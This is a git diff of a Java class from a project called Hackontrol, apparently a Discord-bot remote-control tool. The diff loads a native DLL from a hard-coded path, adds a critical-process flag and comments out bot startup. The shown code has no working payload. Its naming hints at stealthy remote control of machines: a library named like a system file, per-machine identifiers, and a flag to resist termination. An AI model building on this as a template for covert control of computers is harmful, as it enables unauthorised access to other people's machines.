@@ -1,5 +1,6 @@
 package com.khopan.hackontrol;
 
+import java.lang.annotation.Native;
 import java.util.Iterator;
 import java.util.LinkedHashMap;
 import java.util.Map;
@@ -8,15 +9,16 @@ import java.util.Map.Entry;
 import com.khopan.hackontrol.command.CommandManager;
 
 import net.dv8tion.jda.api.JDA;
-import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
 import net.dv8tion.jda.api.interactions.commands.Command;
 import net.dv8tion.jda.api.interactions.commands.build.SlashCommandData;
-import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
 	private static final String LIBRARY_NAME = "win32b.dll";
+
+	@Native
+	private static final boolean CRITICAL_PROCESS = false;
 
 	private final JDA bot;
 	private final Map<Command, com.khopan.hackontrol.command.Command> map;
@@ -26,6 +28,7 @@ public class Hackontrol {
 		this.map = new LinkedHashMap<>();
 		this.bot.addEventListener(new Listener());
 		CommandManager.register(this :: register);
+		System.err.println("Hello, world!");
 	}
 
 	private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
@@ -109,7 +112,8 @@ public class Hackontrol {
 		}
 
 		System.load(libraryFile.getAbsolutePath());*/
-		JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
+		System.load("D:\\GitHub Repository\\Hackontrol\\Native Library\\x64\\Release\\Native Library.dll");
+		/*JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
 				.build();
 
@@ -120,7 +124,7 @@ public class Hackontrol {
 		}
 
 		String machineIdentifier = Machine.getIdentifier();
-		new Hackontrol(bot, machineIdentifier);
+		new Hackontrol(bot, machineIdentifier);*/
 	}
 
 	private class Listener extends ListenerAdapter {
